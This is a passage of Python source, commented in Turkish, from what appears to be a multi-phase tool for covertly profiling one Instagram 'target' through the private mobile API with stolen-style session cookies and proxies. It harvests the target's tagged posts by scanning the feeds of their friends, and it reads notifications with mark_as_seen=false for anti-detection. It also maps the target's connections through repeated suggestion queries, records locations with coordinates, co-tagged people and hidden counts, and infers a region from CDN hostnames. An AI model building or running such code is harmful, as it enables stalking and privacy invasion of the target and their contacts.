            break
        out['pages_fetched'] += 1
        for media in items:
            mid = media.get('id') or media.get('pk')
            code = media.get('code')
            taken_at = media.get('taken_at')
            owner = media.get('user') or {}
            tagger_pk = str(owner.get('pk') or '')
            tagger_un = owner.get('username')
            caption = ((media.get('caption') or {}).get('text') or '')[:300]

            usertags_in = (media.get('usertags') or {}).get('in') or []
            co_tagged = []
            for ut in usertags_in:
                u = ut.get('user') or {}
                co_pk = str(u.get('pk') or '')
                if not co_pk or co_pk == str(target_pk):
                    continue
                co_tagged.append({
                    'pk': co_pk,
                    'username': u.get('username'),
                    'position': ut.get('position'),
                })
                out['co_tagged_users'][co_pk] = (
                    out['co_tagged_users'].get(co_pk, 0) + 1)

            location = media.get('location') or {}
            loc_summary = None
            if location and (location.get('pk') or location.get('name')):
                loc_summary = {
                    'pk': location.get('pk'),
                    'name': location.get('name'),
                    'city': location.get('city'),
                    'short_name': location.get('short_name'),
                    'lat': location.get('lat'),
                    'lng': location.get('lng'),
                    'address': location.get('address'),
                }
                out['locations'].append(loc_summary)

            item = {
                'media_id': str(mid),
                'media_code': code,
                'media_url': (f'https://www.instagram.com/p/{code}/'
                                if code else None),
                'taken_at_ts': taken_at,
                'taken_at_iso': _ts_iso(taken_at, 's'),
                'tagger_pk': tagger_pk,
                'tagger_username': tagger_un,
                'tagger_is_private': owner.get('is_private'),
                'tagger_is_verified': owner.get('is_verified'),
                'caption_head': caption,
                'co_tagged_users': co_tagged,
                'location': loc_summary,
                'media_type': media.get('media_type'),
                'like_count': media.get('like_count'),
                'comment_count': media.get('comment_count'),
            }
            out['items'].append(item)
            out['total_items'] += 1

            t_entry = out['taggers'].setdefault(tagger_pk, {
                'username': tagger_un,
                'is_private': owner.get('is_private'),
                'is_verified': owner.get('is_verified'),
                'tag_count': 0,
                'media_ids': [],
            })
            t_entry['tag_count'] += 1
            t_entry['media_ids'].append(str(mid))

        max_id = d.get('next_max_id')
        if not d.get('more_available') or not max_id:
            break
        time.sleep(0.5)

    return out


def harvest_target_tags_via_cluster(target_pk, cluster, cookies, proxies=None,
                                       max_per_account=24, max_accounts=80):
    """Phase 30 step B: cluster_union üyelerinin public feed'lerini tara,
    her postta `usertags.in[].user.pk == target_pk` filtre uygula.
    Direkt /usertags/feed/ gated dönerse bu pivot içeriği açar.

    Pasif: target hesabına dokunulmuyor — yalnız cluster üyelerinin public
    media'sı taranıyor."""
    headers = _headers(cookies)
    target_pk_str = str(target_pk)
    out = {
        'cluster_size': len(cluster),
        'accounts_scanned': 0,
        'accounts_skipped_private': 0,
        'accounts_skipped_error': 0,
        'media_scanned': 0,
        'tags_found': [],
        'taggers': {},                               
        'co_tagged_users': {},
    }
    cluster_items = list(cluster.items())[:max_accounts]
    for idx, (pk, info) in enumerate(cluster_items, 1):
        if isinstance(info, dict) and info.get('is_private') is True:
            out['accounts_skipped_private'] += 1
            continue
        un = info.get('username') if isinstance(info, dict) else None
        url = (f'https://i.instagram.com/api/v1/feed/user/{pk}/'
                f'?count={max_per_account}')
        try:
            r = requests.get(url, headers=headers, cookies=cookies,
                              timeout=15, proxies=proxies)
            if r.status_code != 200:
                out['accounts_skipped_error'] += 1
                continue
            items = (r.json().get('items') or [])
        except (requests.exceptions.RequestException,
                 json.JSONDecodeError):
            out['accounts_skipped_error'] += 1
            continue
        out['accounts_scanned'] += 1
        for media in items:
            out['media_scanned'] += 1
            usertags_in = (media.get('usertags') or {}).get('in') or []
            target_in_post = False
            co_pks = []
            for ut in usertags_in:
                u = ut.get('user') or {}
                upk = str(u.get('pk') or '')
                if upk == target_pk_str:
                    target_in_post = True
                else:
                    co_pks.append({'pk': upk,
                                    'username': u.get('username')})
            if not target_in_post:
                continue
            mid = media.get('id') or media.get('pk')
            code = media.get('code')
            taken_at = media.get('taken_at')
            location = media.get('location') or {}
            loc_summary = None
            if location and (location.get('pk') or location.get('name')):
                loc_summary = {
                    'pk': location.get('pk'),
                    'name': location.get('name'),
                    'city': location.get('city'),
                    'lat': location.get('lat'),
                    'lng': location.get('lng'),
                }
            entry = {
                'tagger_pk': str(pk),
                'tagger_username': un,
                'media_id': str(mid),
                'media_code': code,
                'media_url': (f'https://www.instagram.com/p/{code}/'
                                if code else None),
                'taken_at_ts': taken_at,
                'taken_at_iso': _ts_iso(taken_at, 's'),
                'caption_head': ((media.get('caption') or {}).get('text')
                                   or '')[:300],
                'co_tagged_users': co_pks,
                'location': loc_summary,
                'media_type': media.get('media_type'),
                'like_count': media.get('like_count'),
                'comment_count': media.get('comment_count'),
            }
            out['tags_found'].append(entry)
            t = out['taggers'].setdefault(str(pk), {
                'username': un, 'tag_count': 0, 'media_ids': []})
            t['tag_count'] += 1
            t['media_ids'].append(str(mid))
            for c in co_pks:
                cpk = c['pk']
                if not cpk:
                    continue
                out['co_tagged_users'][cpk] = (
                    out['co_tagged_users'].get(cpk, 0) + 1)
        time.sleep(0.8)                                                      
    return out


def run_phase30(target_username, target_pk, cookies, proxies=None,
                 max_count=50, max_pages=3, cluster_max=20):
    print(f'[*] Phase 30: TAGGED FEED HARVEST pk={target_pk}')
    intel = {
        'pk': str(target_pk),
        'ts_run': time.time(),
    }

                                                                              
    print(f'  [0] tag metadata from /info/ + HTML SSR /tagged/ ...')
    meta = harvest_target_tagged_metadata(
        target_pk, target_username, cookies, proxies)
    intel['metadata'] = meta
    if meta:
        src = meta.get('source', '?')
        print(f'      data source: {src}')
        if meta.get('live_throttled'):
            print(f'      WARN: {meta["live_throttled"]}')
                               
        print(f'      privacy: is_private={meta.get("is_private")} '
               f'is_verified={meta.get("is_verified")} '
               f'media_count={meta.get("media_count")} '
               f'follower={meta.get("follower_count")} '
               f'following={meta.get("following_count")}')
                         
        ui_hidden = []
        for k in ('should_show_tagged_tab',
                    'show_mentions_banner_on_profile',
                    'is_new_to_instagram', 'has_chaining',
                    'has_private_collections',
                    'show_post_insights_entry_point',
                    'show_text_post_app_switcher_badge',
                    'show_account_transparency_details',
                    'show_fb_link_on_profile',
                    'show_wa_link_on_profile',
                    'allow_manage_memorialization'):
            if k in meta:
                ui_hidden.append(f'{k}={meta[k]}')
        if ui_hidden:
            print(f'      UI-HIDDEN FLAGS (UI hic gostermez):')
            for line in ui_hidden:
                print(f'         {line}')
        if meta.get('usertags_count') is not None:
            print(f'      LEAKED usertags_count = {meta["usertags_count"]} '
                   f'(/info/ icinden)')
        if meta.get('nametag'):
            nt = meta['nametag']
            nt_keys = list(nt.keys()) if isinstance(nt, dict) else []
            print(f'      nametag dict ({len(nt_keys)} alan): {nt_keys[:10]}')
                          
        if meta.get('html_tagged_gating'):
            print(f'      HTML /tagged/ GATED: {meta["html_tagged_gating"]}')
        elif meta.get('html_tagged_shortcodes'):
            print(f'      HTML /tagged/ leaked shortcodes: '
                   f'{meta["html_tagged_shortcodes"][:10]}')
        elif meta.get('html_tagged_redirect'):
            print(f'      HTML /tagged/ redirect: '
                   f'{meta["html_tagged_redirect"]} '
                   f'(status={meta.get("html_tagged_status")})')
        time.sleep(1.0)                             

                                                                          
    print(f'\n  [A] direct /usertags/{{pk}}/feed/ ...')
    direct = harvest_usertags_feed(target_pk, cookies, proxies,
                                     max_count, max_pages)
    intel['direct'] = direct
    leaked = direct.get('leaked_total_count')
    if leaked is not None:
        print(f'      LEAKED total_count = {leaked}  '
               f'(API target\'in {leaked} adet tag\'lenmis post oldugunu '
               f'soyledi; UI bunu hicbir hesap icin gostermez)')
    print(f'      direct items returned: {direct["total_items"]}')
    if direct['total_items'] > 0:
        sorted_taggers = sorted(direct['taggers'].items(),
                                  key=lambda kv: -kv[1]['tag_count'])
        print(f'  [+] direct path - taggers:')
        for pk, info in sorted_taggers[:8]:
            un = info.get('username') or '?'
            print(f'      @{un:<25} pk={pk:<14} '
                   f'count={info["tag_count"]}')

                                                                             
    cluster_path = os.path.join(ARTIFACT_ROOT, target_username,
                                  'cluster_union.json')
    cluster = {}
    if os.path.exists(cluster_path):
        try:
            with open(cluster_path, encoding='utf-8') as f:
                cd = json.load(f)
            cluster = cd.get('cluster') or {}
        except (OSError, json.JSONDecodeError):
            pass

    if not cluster:
        cluster = load_chaining_cluster(target_username)

    if not cluster:
        print(f'  [B] cluster yok, pivot atlandi')
    else:
                                        
        cluster.pop(str(target_pk), None)
        print(f'  [B] cluster pivot: {min(len(cluster), cluster_max)} '
               f'public hesap × 24 media tarama...')
        pivot = harvest_target_tags_via_cluster(
            target_pk, cluster, cookies, proxies,
            max_per_account=24, max_accounts=cluster_max)
        intel['cluster_pivot'] = pivot
        print(f'      scanned={pivot["accounts_scanned"]} '
               f'(private_skip={pivot["accounts_skipped_private"]} '
               f'err={pivot["accounts_skipped_error"]}) '
               f'media={pivot["media_scanned"]}')
        print(f'      TAG MATCHES: {len(pivot["tags_found"])}')

        if pivot['tags_found']:
            tags_sorted = sorted(pivot['tags_found'],
                                   key=lambda t: t.get('taken_at_ts') or 0,
                                   reverse=True)
            print(f'\n  [+] CLUSTER-DISCOVERED TAGS '
                   f'({len(pivot["tags_found"])} adet):')
            for t in tags_sorted[:15]:
                print(f'      {t["taken_at_iso"]} '
                       f'@{t["tagger_username"]:<22} {t["media_url"]}')
                if t.get('caption_head'):
                    print(f'         "{t["caption_head"][:80]}"')
                if t.get('co_tagged_users'):
                    co = ','.join(
                        f'@{c.get("username") or c["pk"]}'
                        for c in t['co_tagged_users'][:5])
                    print(f'         co_tagged: {co}')
                if t.get('location'):
                    print(f'         location: {t["location"].get("name")} '
                           f'({t["location"].get("city")})')

            if pivot['co_tagged_users']:
                un_lookup = {}
                for t in pivot['tags_found']:
                    for c in t.get('co_tagged_users') or []:
                        if c.get('username'):
                            un_lookup[c['pk']] = c['username']
                co_sorted = sorted(pivot['co_tagged_users'].items(),
                                     key=lambda kv: -kv[1])
                print(f'\n  [+] CO-TAGGED USERS '
                       f'({len(co_sorted)} unique):')
                for pk, cnt in co_sorted[:10]:
                    un = un_lookup.get(pk, '?')
                    print(f'      @{un:<25} pk={pk:<14} '
                           f'co_tag_count={cnt}')

                                                                
    if leaked is not None:
        cluster_found = len(intel.get('cluster_pivot', {})
                              .get('tags_found', []))
        coverage = (cluster_found / leaked * 100) if leaked > 0 else 0
        print(f'\n  [=] COVERAGE: leaked_total={leaked}, '
               f'cluster_pivot_found={cluster_found} '
               f'({coverage:.0f}%)')

    path = _save_json(target_username, 'tagged_feed.json', intel)
    print(f'  -> {path}')
    return intel


                                                                               
                                                 
                                                                               
                                                                     
                                                                         
                                                                      
                                                                       
                                                                         
 
                                                                     
                                                                          
                                                   
 
                                  
                                                                          
                                                                           
                                          
                                                          
                                                             
                                                    
                                                            

NEWS_INBOX_REASON_FILTERS = [
    None,                       
    'like',
    'comment',
    'follow',
    'mention',
    'tag',
    'message_request',
]


def harvest_news_inbox(target_pk, cookies, proxies=None, max_pages=4):
    """Phase 31: /api/v1/news/inbox/ — viewer'ın notification feed'ini paginate
    edip target_pk içeren tüm story/event'leri çıkar.

    YENI parametreler (gercek mobile app trafiginden):
      should_skip_su=true       → Suggested User'lari skip et (gercek interaction'lar)
      mark_as_seen=false        → read flag degismesin (anti-detection)
      timezone_name=Europe/...  → timezone-aware filter
      could_truncate_feed=true  → feed limit
    """
    headers = _headers(cookies)
                                    
    headers['x-ig-client-endpoint'] = 'MainFeedFragment:feed_timeline'
    headers['x-fb-friendly-name'] = 'IgApi: news/inbox/'
    target_pk_str = str(target_pk)
    out = {
        'pk': str(target_pk),
        'pages_fetched': 0,
        'total_stories_seen': 0,
        'target_events': [],
        'event_type_counts': {},
        'first_interaction_iso': None,
        'last_interaction_iso': None,
    }
    max_id = None
    for page in range(max_pages):
                                                             
        params = ('activity_module=all'
                   '&fetch_reason=initial_load'
                   '&persistent_messaging_data=true'
                   '&include_old_activities=true'
                   '&could_truncate_feed=true'
                   '&should_skip_su=true'
                   '&mark_as_seen=false'
                   '&timezone_offset=10800'
                   '&timezone_name=Europe%2FIstanbul')
        if max_id:
            params += f'&max_id={max_id}'
        url = f'https://i.instagram.com/api/v1/news/inbox/?{params}'
        try:
            r = requests.get(url, headers=headers, cookies=cookies,
                              timeout=20, proxies=proxies)
        except requests.exceptions.RequestException as e:
            out[f'error_page_{page}'] = type(e).__name__
            break
        if r.status_code != 200:
            out[f'error_page_{page}'] = f'http_{r.status_code}'
            out['last_response_head'] = r.text[:200]
            break
        try:
            d = r.json()
        except json.JSONDecodeError:
            out[f'error_page_{page}'] = 'json_decode'
            break
        out['pages_fetched'] += 1

                                       
                                                                          
        all_stories = []
        for bucket in ('new_stories', 'old_stories', 'stories', 'subscriptions'):
            v = d.get(bucket)
            if isinstance(v, list):
                all_stories.extend(v)
                                                   
        counts = d.get('counts') or {}
        for k in ('new_stories', 'old_stories', 'stories'):
            v = counts.get(k)
            if isinstance(v, list):
                all_stories.extend(v)

        out['total_stories_seen'] += len(all_stories)
        for story in all_stories:
            if not isinstance(story, dict):
                continue
            args = story.get('args') or {}
            story_str = json.dumps(story, ensure_ascii=False, default=str)
            if target_pk_str not in story_str:
                continue
                                                   
            event = {
                'story_type': story.get('story_type'),
                'pk': story.get('pk'),
                'timestamp': args.get('timestamp'),
                'iso': _ts_iso(args.get('timestamp'), 's'),
                'profile_id': args.get('profile_id'),
                'target_id': args.get('target_id'),
                'text': (args.get('text') or '')[:300],
                'rich_text': (args.get('rich_text') or '')[:300],
                'profile_name': args.get('profile_name'),
                'destination': args.get('destination'),
                'media_ids': [str(m.get('id'))
                                for m in (args.get('media') or [])
                                if isinstance(m, dict)][:5],
                'links': args.get('links'),
                'inline_follow': args.get('inline_follow'),
            }
                                                                          
            target_role = []
            if str(args.get('profile_id') or '') == target_pk_str:
                target_role.append('actor')                            
            if str(args.get('target_id') or '') == target_pk_str:
                target_role.append('target')                             
            event['target_role'] = target_role or ['mention_only']
            out['target_events'].append(event)
            stype = story.get('story_type')
            out['event_type_counts'][str(stype)] = (
                out['event_type_counts'].get(str(stype), 0) + 1)
            ts = args.get('timestamp')
            if isinstance(ts, (int, float)):
                if (out['first_interaction_iso'] is None
                        or ts < (out.get('_first_ts') or float('inf'))):
                    out['_first_ts'] = ts
                    out['first_interaction_iso'] = _ts_iso(ts, 's')
                if (out['last_interaction_iso'] is None
                        or ts > (out.get('_last_ts') or 0)):
                    out['_last_ts'] = ts
                    out['last_interaction_iso'] = _ts_iso(ts, 's')

        max_id = d.get('next_max_id')
        if not max_id:
            break
        time.sleep(0.6)
    out.pop('_first_ts', None)
    out.pop('_last_ts', None)
    return out


def run_phase31(target_username, target_pk, cookies, proxies=None,
                 max_pages=4):
    print(f'[*] Phase 31: NEWS INBOX HARVEST pk={target_pk} '
           f'(asimetrik: viewer-side notification feed)')
    intel = harvest_news_inbox(target_pk, cookies, proxies, max_pages)
    print(f'  pages_fetched={intel["pages_fetched"]} '
           f'total_stories_seen={intel["total_stories_seen"]} '
           f'target_events={len(intel["target_events"])}')

    if not intel['target_events']:
        for k, v in list(intel.items()):
            if k.startswith('error_'):
                print(f'  [!] {k}: {v}')
        if intel.get('last_response_head'):
            print(f'  head: {intel["last_response_head"][:160]}')
        if intel['total_stories_seen'] == 0:
            print(f'  [-] news_inbox bos donduyse: viewer\'in bildirim feed\'i '
                   f'temiz veya endpoint gated')
        else:
            print(f'  [-] {intel["total_stories_seen"]} story tarandi, '
                   f'target_pk hicbir story\'de gecmiyor — target viewer\'a '
                   f'asla etkilesim yapmamis')
    else:
        print(f'\n  [+] EVENT TYPE BREAKDOWN:')
        for stype, cnt in sorted(intel['event_type_counts'].items(),
                                    key=lambda kv: -kv[1]):
            print(f'      {stype:<30} = {cnt}')

        if intel['first_interaction_iso']:
            print(f'\n  [+] INTERACTION TIMELINE:')
            print(f'      first: {intel["first_interaction_iso"]}')
            print(f'      last:  {intel["last_interaction_iso"]}')

        sorted_events = sorted(intel['target_events'],
                                  key=lambda e: e.get('timestamp') or 0,
                                  reverse=True)
        print(f'\n  [+] LATEST 15 TARGET EVENTS:')
        for e in sorted_events[:15]:
            roles = '/'.join(e['target_role'])
            txt = (e.get('text') or e.get('rich_text') or '')[:80]
            print(f'      {e.get("iso"):<25} {e.get("story_type"):<20} '
                   f'[{roles}] {txt}')

    path = _save_json(target_username, 'news_inbox_phase31.json', intel)
    print(f'  -> {path}')
    return intel


                                                                               
                                                      
                                                                               
                                                                                 
 
                                                                             
                                                                           
                                                                           
                                                                      
 
                                                                        
                                                                                  
                                                                              
                                                            
                                    
                                                                        
                                                                
                                                             

                                                                      
                                                                       
                            
CHAINING_MODULES = (
    'profile', 'ayml_profile_card', 'explore_v2_profile_card',
    'notification_center', 'dm_thread', 'barcelona_profile',
    'feed_timeline', 'profile_about', 'feed_short_url',
    'discover_people', 'story_viewer', 'follow_request',
    'highlight_viewer', 'reels_viewer', 'audio_page',
)


def harvest_discover_chaining(target_pk, cookies, proxies=None,
                                  module_name='profile'):
    """Phase 32: /discover/chaining/?target_id={pk}&module_name={M} — 80
    algoritmik komşu. module_name farkli ranking pool dondurur."""
    headers = _headers(cookies)
    out = {
        'pk': str(target_pk),
        'users_count': 0,
        'is_backup': None,
        'is_recommend_account': None,
        'follow_ranking_token': None,
        'module_name': module_name,
        'users': [],
        'social_context_breakdown': {
            'real_connection_count': 0,
            'suggested_count': 0,
            'no_context_count': 0,
        },
        'verified_users': [],
        'private_user_count': 0,
        'public_user_count': 0,
    }
    url = (f'https://i.instagram.com/api/v1/discover/chaining/'
            f'?target_id={target_pk}&include_reel=true&module_name={module_name}')
    try:
        r = requests.get(url, headers=headers, cookies=cookies,
                          timeout=20, proxies=proxies)
    except requests.exceptions.RequestException as e:
        out['error'] = type(e).__name__
        return out
    if r.status_code != 200:
        out['error'] = f'http_{r.status_code}'
        out['response_head'] = r.text[:200]
        return out
    try:
        d = r.json()
    except json.JSONDecodeError:
        out['error'] = 'json_decode'
        return out

    users = d.get('users') or []
    out['users_count'] = len(users)
    out['is_backup'] = d.get('is_backup')
    out['is_recommend_account'] = d.get('is_recommend_account')
    out['follow_ranking_token'] = d.get('follow_ranking_token')

    for u in users:
        if not isinstance(u, dict):
            continue
        sc = u.get('social_context') or ''
        fn = u.get('full_name') or ''
        if sc == 'Suggested':
            ctx_class = 'suggested'
            out['social_context_breakdown']['suggested_count'] += 1
        elif sc and sc == fn:
            ctx_class = 'real_connection'
            out['social_context_breakdown']['real_connection_count'] += 1
        elif sc:
            ctx_class = 'other'
            out['social_context_breakdown']['real_connection_count'] += 1
        else:
            ctx_class = 'no_context'
            out['social_context_breakdown']['no_context_count'] += 1

        if u.get('is_private'):
            out['private_user_count'] += 1
        else:
            out['public_user_count'] += 1
        if u.get('is_verified'):
            out['verified_users'].append({
                'pk': str(u.get('pk') or ''),
                'username': u.get('username'),
                'full_name': fn,
            })

        out['users'].append({
            'pk': str(u.get('pk') or ''),
            'username': u.get('username'),
            'full_name': fn,
            'is_private': u.get('is_private'),
            'is_verified': u.get('is_verified'),
            'social_context': sc,
            'context_class': ctx_class,
            'profile_chaining_secondary_label':
                u.get('profile_chaining_secondary_label'),
            'profile_pic_id': u.get('profile_pic_id'),
            'profile_pic_url': u.get('profile_pic_url'),
            'chaining_info': u.get('chaining_info'),
        })
    return out


def _merge_into_cluster_union(target_username, chain_users):
    """Phase 32 sonucunu cluster_union.json'la merge et — full_name + privacy
    state ile cluster_union zenginleştir."""
    cu_path = os.path.join(ARTIFACT_ROOT, target_username, 'cluster_union.json')
    if not os.path.exists(cu_path):
        return None
    try:
        with open(cu_path, encoding='utf-8') as f:
            cu = json.load(f)
    except (OSError, json.JSONDecodeError):
        return None
    cluster = cu.get('cluster') or {}
    added = 0
    enriched = 0
    for u in chain_users:
        pk = u.get('pk')
        if not pk:
            continue
        if pk not in cluster:
            cluster[pk] = {
                'username': u.get('username'),
                'source_modules': ['phase32_discover_chaining'],
            }
            added += 1
        entry = cluster[pk]
                                                      
        for k in ('full_name', 'is_private', 'is_verified',
                   'social_context', 'context_class'):
            if u.get(k) is not None and not entry.get(k):
                entry[k] = u[k]
                enriched += 1
    cu['cluster'] = cluster
    cu['phase32_merged_at'] = time.time()
    _save_json(target_username, 'cluster_union.json', cu)
    return {'added': added, 'enriched': enriched, 'final_size': len(cluster)}


def run_phase32(target_username, target_pk, cookies, proxies=None,
                 multi_run=1):
    """multi_run > 1: discover/chaining'i N kez cagir, her run sonucunu mevcut
    discover_chaining_phase32.json + cluster_union.json'a MERGE et. Stokastik
    sample havuzunu agresif sekilde buyutur (her call ~80 user, %20-30 yeni)."""
    print(f'[*] Phase 32: DISCOVER CHAINING ({multi_run}x) pk={target_pk}')

                                                                              
                                                                           
                                                             
    all_users_by_pk = {}
    last_intel = None
    successful_runs = 0
    for run_idx in range(multi_run):
        module = CHAINING_MODULES[run_idx % len(CHAINING_MODULES)]
        if run_idx > 0:
            print(f'  [run {run_idx + 1}/{multi_run}] module={module}')
            time.sleep(1.5)                       
        else:
            print(f'  [run 1/{multi_run}] module={module}')
        intel = harvest_discover_chaining(target_pk, cookies, proxies,
                                            module_name=module)
        last_intel = intel
        if intel.get('error'):
            print(f'  [!] run {run_idx + 1} error: {intel["error"]}')
            continue
        successful_runs += 1
                                                                             
                                                                           
                                                               
        observation_run_id = successful_runs - 1

                                                                         
                                                                          
        users_this_run = {}
        for run_internal_rank, raw_user in enumerate(intel.get('users') or []):
            pk = raw_user.get('pk')
            if not pk:
                continue
            pk_s = str(pk)
            current = users_this_run.get(pk_s)
            if current is None or run_internal_rank < current[0]:
                users_this_run[pk_s] = (run_internal_rank, raw_user)

        for pk_s, (run_internal_rank, raw_user) in users_this_run.items():
            if pk_s not in all_users_by_pk:
                user = dict(raw_user)
                user['_first_seen_rank'] = run_internal_rank
                user['_first_seen_run'] = observation_run_id
                user['_seen_runs'] = [observation_run_id]
                user['_all_ranks'] = [run_internal_rank]
                all_users_by_pk[pk_s] = user
            else:
                user = all_users_by_pk[pk_s]
                seen_runs = user.setdefault('_seen_runs', [])
                all_ranks = user.setdefault('_all_ranks', [])
                if observation_run_id not in seen_runs:
                    seen_runs.append(observation_run_id)
                    all_ranks.append(run_internal_rank)
        print(f'    run {run_idx + 1}: +{len(users_this_run)} unique users '
               f'→ union_so_far={len(all_users_by_pk)}')

                                                    
    p32_path = os.path.join(ARTIFACT_ROOT, target_username,
                              'discover_chaining_phase32.json')
    previous_size = 0
    if os.path.exists(p32_path):
        try:
            with open(p32_path, encoding='utf-8') as f:
                old = json.load(f)
            old_users = old.get('users') or []
            previous_size = len(old_users)
            for u in old_users:
                pk = u.get('pk')
                pk_s = str(pk) if pk else ''
                if pk_s and pk_s not in all_users_by_pk:
                    archived = dict(u)
                                                                              
                                                                             
                                                                         
                    archived['_seen_runs'] = []
                    archived['_all_ranks'] = []
                    archived['_first_seen_rank'] = None
                    archived['_first_seen_run'] = None
                    archived['_current_session_seen'] = False
                    all_users_by_pk[pk_s] = archived
        except (OSError, json.JSONDecodeError):
            pass

    intel = last_intel or {}
    intel['users'] = list(all_users_by_pk.values())
    intel['users_count'] = len(all_users_by_pk)
    intel['requested_multi_run_count'] = multi_run
    intel['successful_run_count'] = successful_runs
    intel['multi_run_count'] = successful_runs
    intel['this_session_runs'] = successful_runs
    intel['previous_disk_size'] = previous_size
    intel['after_merge_size'] = len(all_users_by_pk)

                                    
    sc = {'real_connection_count': 0, 'suggested_count': 0, 'no_context_count': 0}
    private_count = 0
    public_count = 0
    verified_users = []
    for u in intel['users']:
        ctx = u.get('context_class') or 'no_context'
        if ctx == 'real_connection' or ctx == 'other':
            sc['real_connection_count'] += 1
        elif ctx == 'suggested':
            sc['suggested_count'] += 1
        else:
            sc['no_context_count'] += 1
        if u.get('is_private'):
            private_count += 1
        else:
            public_count += 1
        if u.get('is_verified'):
            verified_users.append({
                'pk': str(u.get('pk') or ''),
                'username': u.get('username'),
                'full_name': u.get('full_name')})
    intel['social_context_breakdown'] = sc
    intel['private_user_count'] = private_count
    intel['public_user_count'] = public_count
    intel['verified_users'] = verified_users

    print(f'  [+] MERGED TOTAL: {len(all_users_by_pk)} unique users '
           f'(prev_disk={previous_size}, this_session={multi_run} runs)')

    if intel.get('error') and not all_users_by_pk:
        print(f'  [!] error: {intel["error"]}')
        if intel.get('response_head'):
            print(f'      head: {intel["response_head"][:150]}')
        path = _save_json(target_username, 'discover_chaining_phase32.json',
                            intel)
        print(f'  -> {path}')
        return intel
    intel.pop('error', None)
    intel.pop('response_head', None)

    print(f'  users_count={intel["users_count"]} '
           f'is_backup={intel["is_backup"]} '
           f'is_recommend={intel["is_recommend_account"]}')
    sc = intel['social_context_breakdown']
    print(f'  social_context: real_connection={sc["real_connection_count"]} '
           f'suggested={sc["suggested_count"]} '
           f'no_context={sc["no_context_count"]}')
    print(f'  privacy: private={intel["private_user_count"]} '
           f'public={intel["public_user_count"]}')

    if intel['verified_users']:
        print(f'\n  [+] VERIFIED USERS in chain ({len(intel["verified_users"])}):')
        for u in intel['verified_users']:
            print(f'      @{u["username"]:<25} '
                   f'pk={u["pk"]:<14} fn={u["full_name"]!r}')

    suggested = [u for u in intel['users']
                 if (u.get('context_class') or 'no_context') == 'suggested']
    real = [u for u in intel['users']
            if (u.get('context_class') or 'no_context') == 'real_connection']
    if suggested:
        print(f'\n  [+] ALGORITHMIC SUGGESTIONS '
               f'({len(suggested)} users, social_context="Suggested"):')
        for u in suggested[:10]:
            priv = ' [PRIV]' if u.get('is_private') else ''
            print(f'      @{(u.get("username") or "?"):<25} '
                  f'pk={str(u.get("pk") or ""):<14} '
                   f'fn={u.get("full_name")!r}{priv}')

    print(f'\n  [+] TOP REAL-CONNECTION USERS '
           f'(social_context=full_name, ilk 20):')
    for u in real[:20]:
        priv = ' [PRIV]' if u.get('is_private') else ''
        ver = ' [VER]' if u.get('is_verified') else ''
        print(f'      @{(u.get("username") or "?"):<28} '
              f'pk={str(u.get("pk") or ""):<14} '
               f'fn={u.get("full_name")!r}{priv}{ver}')

                              
    merge = _merge_into_cluster_union(target_username, intel['users'])
    if merge:
        print(f'\n  [+] CLUSTER_UNION MERGE: '
               f'added={merge["added"]} enriched={merge["enriched"]} '
               f'final_size={merge["final_size"]}')

    path = _save_json(target_username, 'discover_chaining_phase32.json', intel)
    print(f'  -> {path}')
    return intel


                                                                               
                                                                    
                                                                               
                                                                             
                                          
 
                                                                  
                                                                         
                                                                     
 
                                                                           
                                                                           
                                                                           
                                                               
                                                    
 
                                                               
                                                                            
                                                                      
 
                                                                     
                                                                      
                                                                     
                                                                       
                                                                       
                                                                        
                                                                       
 
                                          
                                           
                                                                        
                                                                     
                                                    
                                                      
 
                                                      
                                                                     
                                                        
                                                                      
                                                                           
 
                                                    
                                                                         
                                                                             
                                                                              
 
                                                                         
                                                                     
                                                                            
                                                                          
 
                                                                
 
                                                     
                                                                   
 
                                                                   
                                                                         
                                                                       
 
                                                    
                                                       
                                                                 
                                                             
 
                                                             
                                                                   
                                                                 
                                                                
                                                                        
                                                                           
                                                                   
 
                                  
                                                               
                                                                 
 
                                                                     
                                                                     
                                                                          
                                                                 
                                                                           
                                                                 
 
                             
                                                                           
                                                                        
 
                                                                   
                                                                      
                                                                        
                                                           

import re as _re_p33


_IG_EPOCH_MS = 1314220021721                                                
_CDN_EDGE_REGION_HINTS = {
    'ist': 'Istanbul (TR)',
    'ams': 'Amsterdam (NL)',
    'lhr': 'London (UK)',
    'fra': 'Frankfurt (DE)',
    'cdg': 'Paris (FR)',
    'arn': 'Stockholm (SE)',
    'mad': 'Madrid (ES)',
    'mxp': 'Milan (IT)',
    'vie': 'Vienna (AT)',
    'waw': 'Warsaw (PL)',
    'prg': 'Prague (CZ)',
    'otp': 'Bucharest (RO)',
    'sof': 'Sofia (BG)',
    'hel': 'Helsinki (FI)',
    'ord': 'Chicago (US)',
    'iad': 'Ashburn VA (US)',
    'lax': 'Los Angeles (US)',
    'sjc': 'San Jose (US)',
    'mia': 'Miami (US)',
    'atl': 'Atlanta (US)',
    'dfw': 'Dallas (US)',
    'lga': 'New York (US)',
    'yyz': 'Toronto (CA)',
    'gru': 'Sao Paulo (BR)',
    'eze': 'Buenos Aires (AR)',
    'scl': 'Santiago (CL)',
    'bom': 'Mumbai (IN)',
    'maa': 'Chennai (IN)',
    'hkg': 'Hong Kong (HK)',
    'sin': 'Singapore (SG)',
    'nrt': 'Tokyo (JP)',
    'icn': 'Seoul (KR)',
    'syd': 'Sydney (AU)',
    'mel': 'Melbourne (AU)',
    'jnb': 'Johannesburg (ZA)',
    'cai': 'Cairo (EG)',
    'dxb': 'Dubai (AE)',
    'tlv': 'Tel Aviv (IL)',
}


def _parse_cdn_url(url):
    """profile_pic_url'ünden CDN edge node + cache buster + access hash çıkar."""
    if not url:
        return {}
    out = {}
    m = _re_p33.match(r'https?://scontent-([a-z]+)(\d+)-(\d+)\.cdninstagram\.com',
                       url)
    if m:
        region_code = m.group(1).lower()
        out['cdn_region_code'] = region_code
        out['cdn_region_hint'] = _CDN_EDGE_REGION_HINTS.get(
            region_code, f'unknown ({region_code})')
        out['cdn_pop'] = m.group(2)
        out['cdn_node'] = m.group(3)
    for key in ('_nc_cat', '_nc_oc', '_nc_ohc', '_nc_gid', '_nc_sid',
                 'oe', 'oh', 'edm', 'efg', 'ig_cache_key', 'stp', 'ccb'):
        rm = _re_p33.search(rf'[?&]{_re_p33.escape(key)}=([^&]+)', url)
        if rm:
            out[key] = rm.group(1)
    if out.get('oe'):
        try:
            ts_int = int(out['oe'], 16)
            out['oe_expires_iso'] = _ts_iso(ts_int, 's')
        except ValueError:
            pass
    return out


def _decode_profile_pic_id(ppi, target_pk):
    out = {}
    if not ppi or '_' not in str(ppi):
        return out
    media_part, uploader = str(ppi).split('_', 1)
    out['media_id'] = media_part
    out['uploader_pk'] = uploader
